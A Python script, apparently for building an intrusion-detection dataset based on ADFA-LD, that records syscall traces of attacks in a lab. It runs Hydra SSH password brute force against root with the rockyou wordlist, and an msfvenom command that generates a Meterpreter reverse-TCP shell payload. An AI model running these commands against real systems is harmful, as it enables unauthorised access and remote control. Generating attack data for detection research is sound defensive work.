import csv
import subprocess


def get_syscall_from_ssh():
    wordList = '/usr/share/wordlists/rockyou.txt'
    ip = '10.10.10.16'
    name = 'root'
    output_file = 'output.txt'
    syscall_names_file_base = 'UAD-Hydra-SSH.txt'
    csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'

    for i in range(20):

        cmd1 = "strace -e trace=all -o {output_file} hydra -l {name} -p {wordList} {ip} ssh".format(output_file=output_file, name=name, wordList=wordList, ip=ip)
        cmd2 = "awk -F '(' '{{print $1}}' {output_file} | awk -F ' ' '{{print $NF}}' > {syscall_names_file_base}".format(output_file=output_file, syscall_names_file_base=syscall_names_file_base)

        # Exécutez la commande 1
        process = subprocess.Popen(cmd1, shell=True)
        process.wait()

        # Exécutez la commande 2
        process = subprocess.Popen(cmd2, shell=True)
        process.wait()

        replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/UAD-Hydra-SSH-1-{i}.txt'.format(i=i))


def get_syscall_from_Meterpreter():
    payload = "meterpreterPayload"
    ip = "10.10.10.118"
    cmd1 = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 --platform linux -a x86 -f elf -o {payload}".format(ip=ip, payload=payload)

    # Exécutez la commande 1
    process = subprocess.Popen(cmd1, shell=True)
    process.wait()

def replace_syscall_with_number(input_file, csv_file, output_file):
    syscall_dict_sys = {}
    syscall_dict_NR = {}
    with open(csv_file, 'r') as csv_file:
        reader = csv.reader(csv_file)
        for row in reader:
            if not row or len(row) < 2:  # Skip the row if it is empty or if it doesn't have at least 2 elements
                continue
            syscall_name_NR = row[0]
            syscall_number = row[1]
            syscall_name_sys = row[2].strip()
            syscall_dict_NR[syscall_name_NR] = syscall_number
            syscall_dict_sys[syscall_name_sys] = syscall_number



    with open(input_file, 'r') as input_file, open(output_file, 'w') as output_file:
        for line in input_file:
            syscall_name = line.strip()
            if syscall_name[0] == '_':
                    syscall_name = syscall_name[1:]

            if syscall_name in syscall_dict_sys:                
                syscall_number = syscall_dict_sys[syscall_name]
                syscall_number = syscall_number.strip()
                output_file.write(syscall_number + ' ')

            elif syscall_name in syscall_dict_NR:
                syscall_number = syscall_dict_NR[syscall_name]
                syscall_number = syscall_number.strip()
                output_file.write(syscall_number + ' ')

            else:
                print('Syscall name not found: ' + syscall_name)
        
        


# get_syscall_from_ssh()
get_syscall_from_Meterpreter()